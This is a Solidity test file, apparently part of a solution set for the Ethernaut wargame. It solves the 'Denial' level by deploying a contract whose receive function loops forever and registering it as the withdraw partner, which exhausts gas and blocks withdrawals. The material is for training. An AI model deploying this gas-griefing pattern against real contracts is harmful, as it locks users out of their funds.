// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {DenialFactory} from "../src/factories/DenialFactory.sol";
import {Denial} from "../src/levels/Denial.sol";

contract DenialTest is EthernautTest {
    function setUp() public override {
        super.setUp();
        DenialFactory factory = new DenialFactory();
        ethernaut.registerLevel(factory);
        levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(
            factory
        );
    }

    function testSolveDenial() public {
        Denial instance = Denial(payable(levelAddress));

        // [START]

        // 1. Deploy attacker contract
        DenialAttack attacker = new DenialAttack();

        // 2. Set partner
		instance.setWithdrawPartner(address(attacker));

        // [END]

        assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}

contract DenialAttack {
    receive() external payable {
        while (true) {}
    }
}
